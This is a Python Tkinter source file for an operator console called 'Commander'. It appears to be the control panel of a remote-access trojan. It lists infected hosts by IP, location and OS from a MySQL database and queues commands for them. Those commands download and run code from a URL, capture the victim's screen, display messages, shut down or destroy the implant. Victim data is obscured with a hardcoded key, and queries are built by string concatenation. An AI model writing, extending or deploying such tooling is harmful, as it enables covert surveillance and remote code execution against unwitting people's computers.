import tkinter as tk
import tkinter.ttk as ttk
import mysql.connector
import base64
# import win32api
import webbrowser
import os
from PIL import ImageTk, Image
from tkinter import simpledialog

version = "0.0.1"
password = "Un1c0rn!Piz~a"

TBL_ID = 0
TBL_IP = 1
TBL_LOCATION = 2
TBL_LAST_SESSION_TOKEN = 3
TBL_LAST_ACTIVE = 4
TBL_PEEK = 7
TBL_THUMB = 8
TBL_AGENT = 9
TBL_VER = 10
TBL_ACTIVE = 11
TBL_DATE_ESTABLISHED = 5
TBL_DEL = 6
TBL_ACTION = 3
TBL_VALUE = 4

ACT_DROPLOAD = 95
ACT_DISABLE_PEEK = 96
ACT_MESSAGE = 97
ACT_ENABLE_PEEK = 98
ACT_SHUTDOWN = 99
ACT_DESTROY = 100


# --------------- UTILITY FUNCTIONS --------------- #


def encode(clear):
    try:
        global password
        key = password
        enc = []
        for i in range(len(clear)):
            key_c = key[i % len(key)]
            enc_c = chr((ord(clear[i]) + ord(key_c)) % 256)
            enc.append(enc_c)
        return base64.urlsafe_b64encode("".join(enc).encode()).decode()
    except ValueError:
        # win32api.MessageBox(0, "Error encoding.", 'Error')
        return None


def decode(enc):
    if enc:
        try:
            global password
            key = password
            dec = []
            enc = base64.urlsafe_b64decode(enc).decode()
            for i in range(len(enc)):
                key_c = key[i % len(key)]
                dec_c = chr((256 + ord(enc[i]) - ord(key_c)) % 256)
                dec.append(dec_c)
            return "".join(dec)
        except ValueError:
            # win32api.MessageBox(0, "Error decoding.", 'Error')
            return None
    else:
        return 'Unknown'


# --------------- APPLICATION MAIN --------------- #

class Application(tk.Frame):
    str_connection_status = None
    lb_connection_status = None
    treeview_userlist = None
    vbs_userlist = None
    menu_userlist = None
    cur_item = None
    cur_item_id = None
    cur_item_session = None
    pending_action = None
    answer = None
    peekwin = None
    canv = None
    thumb = None
    file = None

    def __init__(self, master=None):
        tk.Frame.__init__(self, master)
        master.title("Commander [" + version + "]")
        master.maxsize(width=600, height=300)
        master.resizable(0, 0)

        self._job = None

        self.config = {
            'user': 'root',
            'password': '',
            'host': '127.0.0.1',
            'database': 'sql2224914',
            'port': 3306,
            'raise_on_warnings': False,
        }

        self.cnx = None

        try:
            self.cnx = mysql.connector.connect(**self.config)
            self.cursor = self.cnx.cursor(buffered=True)
            if self.cnx.is_connected():
                print("[!] Target server established.")
        except mysql.connector.Error as err:
            print("1 - " + format(err))

        self.pack()
        self.create_widgets()

    def create_widgets(self):
        self.str_connection_status = tk.StringVar()
        self.lb_connection_status = tk.Label(self,
                                             textvariable=self.str_connection_status,
                                             bg="yellow",
                                             fg="white",
                                             font=("Arial", 12),
                                             width=100)

        if self.cnx is not None and self.cnx.is_connected():
            self.str_connection_status.set('Connected')
            self.lb_connection_status.config(bg="#42c44d")
        else:
            self.str_connection_status.set('Disconnected')
            self.lb_connection_status.config(bg="#bc3636")

        self.treeview_userlist = ttk.Treeview(self,
                                              columns=('id', 'ip', 'location', 'os', 'version', 'active'),
                                              show="headings")

        self.vbs_userlist = ttk.Scrollbar(self, orient="vertical", command=self.treeview_userlist.yview)
        self.vbs_userlist.place(x=583, y=24, height=225)
        self.treeview_userlist.configure(yscrollcommand=self.vbs_userlist.set)

        self.treeview_userlist.column("id", width=30)
        self.treeview_userlist.column("ip", width=100)
        self.treeview_userlist.column("location", width=170)
        self.treeview_userlist.column("os", width=160)
        self.treeview_userlist.column("version", width=60)
        self.treeview_userlist.column("active", width=60)

        self.treeview_userlist.heading("id", text="ID", anchor=tk.W)
        self.treeview_userlist.heading("ip", text="IP", anchor=tk.W)
        self.treeview_userlist.heading("location", text="Location", anchor=tk.W)
        self.treeview_userlist.heading("os", text="OS", anchor=tk.W)
        self.treeview_userlist.heading("version", text="Version", anchor=tk.W)
        self.treeview_userlist.heading("active", text="Active", anchor=tk.W)

        self.menu_userlist = tk.Menu(self, tearoff=0)

        self.menu_userlist.add_command(label="Message", command=self.message)
        self.menu_userlist.add_command(label="View Screen", command=self.peek)
        self.menu_userlist.add_command(label="Download & Run", command=self.dropload)
        self.menu_userlist.add_separator()
        self.menu_userlist.add_command(label="Shutdown Server", command=self.shutdown)
        self.menu_userlist.add_command(label="Destroy Server", command=self.destroy_server)

        self.treeview_userlist.bind("<Button-3>", self.do_popup)
        self.treeview_userlist.bind("<ButtonRelease-1>", self.select_item)

        self.lb_connection_status.pack()
        self.treeview_userlist.pack(anchor="w")
        self.check_connection_status()

        if self.cnx is not None and self.cnx.is_connected():
            self.initialise()

    def dropload(self):
        self.answer = simpledialog.askstring("Input", "Input URL below:", parent=self)
        if self.answer:
            self.issue_action(self.cur_item_session, ACT_DROPLOAD, self.answer)

    def message(self):
        self.answer = simpledialog.askstring("Input", "Input message below.", parent=self)
        if self.answer:
            self.issue_action(self.cur_item_session, ACT_MESSAGE, self.answer)

    def issue_action(self, session_token, action, value):
        if self.cnx is not None and self.cnx.is_connected():
            self.cursor.execute("INSERT INTO tbl_actions (session_token, action, value) " 
                                "VALUES ('" + session_token + "', 'a~" + str(action) + "', '" + encode(value) + "')")
            self.cnx.commit()
            return True
        else:
            return False

    def peek(self, event=None):
        self.issue_action(self.cur_item_session, ACT_ENABLE_PEEK, '')
        if self.peekwin:
            self.peekwin.destroy()
            self.peekwin = None
        self.peekwin = tk.Toplevel(self)
        self.peekwin.wm_title("Peeking [" + self.cur_item_session + "]")
        self.peekwin.resizable(True, True)
        self.peekwin.canv = tk.Canvas(self.peekwin, width=500, height=350, bg='black')
        self.peekwin.canv.configure(cursor="plus")
        self.peekwin.canv.pack(fill=tk.BOTH, expand=1)
        self.peekwin.protocol("WM_DELETE_WINDOW", self.close_peek)

    def close_peek(self):
        self.issue_action(self.cur_item_session, ACT_DISABLE_PEEK, '')
        if self.peekwin:
            self.peekwin.destroy()
            self.peekwin = None

    def destroy_server(self):
        if self.cur_item_id is not None:
            self.issue_action(self.cur_item_session, ACT_DESTROY, '')

    def shutdown(self):
        if self.cur_item_id is not None:
            self.issue_action(self.cur_item_session, ACT_SHUTDOWN, '')

    def do_popup(self, event):
        if self.cur_item_id:
            try:
                self.menu_userlist.tk_popup(event.x_root+40, event.y_root+10, 0)
            finally:
                self.menu_userlist.grab_release()

        return event

    def select_item(self, event):
        try:
            self.cur_item = self.treeview_userlist.focus()
            if self.cur_item_id is not None and self.treeview_userlist.focus() != '' \
                    and self.cur_item_id == self.treeview_userlist.item(self.cur_item)['values'][TBL_ID]:
                self.treeview_userlist.selection_remove(self.treeview_userlist.selection())
                self.cur_item = None
                self.cur_item_id = None
                self.cur_item_session = None
            elif self.treeview_userlist.focus() != '':
                self.cur_item_id = self.treeview_userlist.item(self.cur_item)['values'][TBL_ID]
                self.cur_item_session = self.treeview_userlist.item(self.cur_item)['text']
            print('[!] User Selected:', self.cur_item_id, self.cur_item_session)
        except ValueError:
            print('[!] Oops!')
        return event

    def check_connection_status(self):
        if self.cnx is not None and self.cnx.is_connected():
            self.str_connection_status.set('Connected')
            self.lb_connection_status.config(bg="#42c44d")
            self.lb_connection_status.pack()
        else:
            self.str_connection_status.set('Disconnected')
            self.lb_connection_status.config(bg="#bc3636")
            self.lb_connection_status.pack()
            try:
                self.cnx = mysql.connector.connect(**self.config)
                self.cursor = self.cnx.cursor(buffered=True)
                if self.cnx.is_connected():
                    print("[!] Target server re-established.")
                    self.initialise()
            except mysql.connector.Error as err:
                print("1 - " + format(err))

        self.after(5000, self.check_connection_status)

    def get_userlist(self):
        self.treeview_userlist.delete(*self.treeview_userlist.get_children())
        if self.cnx is not None and self.cnx.is_connected():
            self.cursor.execute("SELECT *, "
                                "CASE "
                                "WHEN TIMESTAMPDIFF(SECOND, last_active, CURRENT_TIMESTAMP) <= 30 "
                                "THEN CONCAT('Y [', TIMESTAMPDIFF(SECOND, last_active, CURRENT_TIMESTAMP), ']') "
                                "ELSE 'N' "
                                "END as `active` "
                                "FROM tbl_users WHERE del = 0 ORDER BY active DESC")

            self.cnx.commit()
            r0 = self.cursor.fetchall()
            if not r0:
                print('[!] No users to load.')
            else:
                for user in r0:
                    if user[TBL_ID] == self.cur_item_id and self.peekwin:
                        self.thumb = None
                        if user[TBL_THUMB] != '' and user[TBL_THUMB] is not None:
                            file = open("thumb.jpg", "wb")
                            file.write(base64.b64decode(user[TBL_THUMB]))
                            file.close()
                            self.thumb = Image.open('thumb.jpg')
                            self.thumb = self.thumb.resize(
                                (
                                    self.peekwin.canv.winfo_width(),
                                    self.peekwin.canv.winfo_height()
                                 ),
                                Image.ANTIALIAS)
                            self.thumb = ImageTk.PhotoImage(self.thumb)
                            self.peekwin.canv.create_image(0 + (self.peekwin.canv.winfo_width()/2), 0 + (self.peekwin.canv.winfo_height()/2), image=self.thumb)
                            os.remove('thumb.jpg')

                    self.treeview_userlist.insert(
                        '',
                        'end',
                        '',
                        text=user[TBL_LAST_SESSION_TOKEN],
                        values=(
                            user[TBL_ID],
                            decode(user[TBL_IP]),
                            decode(user[TBL_LOCATION]),
                            decode(user[TBL_AGENT]),
                            user[TBL_VER],
                            user[TBL_ACTIVE]
                        )
                    )
                    if user[TBL_PEEK] != '' and user[TBL_PEEK] is not None:
                        try:
                            file = open("peek.html", "w")
                            file.write("<img width='80%' src='data:image/png;base64," + user[TBL_PEEK] + "'>")
                            file.close()

                            webbrowser.open_new_tab('file://' + os.path.realpath("peek.html"))
                            self.cursor.execute("UPDATE tbl_users SET peek = NULL WHERE "
                                                "ip = %s AND last_session_token = %s",
                                                (user[TBL_IP], user[TBL_LAST_SESSION_TOKEN]))
                            self.cnx.commit()
                        except ValueError:
                            print('[x] Error peeking.')

            if self.cur_item_id is not None:
                for child in self.treeview_userlist.get_children():
                    if self.treeview_userlist.item(child)["values"][TBL_ID] == self.cur_item_id:
                        self.treeview_userlist.selection_set(child)
                        self.cur_item_id = self.treeview_userlist.item(child)['values'][TBL_ID]
                        self.cur_item_session = self.treeview_userlist.item(child)['text']

    def initialise(self):
        if self.cnx is not None and self.cnx.is_connected():
            # print("[!] Initialising")
            self.get_userlist()

        if self.peekwin:
            self.after(500, self.initialise)
        else:
            self.after(3000, self.initialise)


root = tk.Tk()
app = Application(master=root)
root.mainloop()
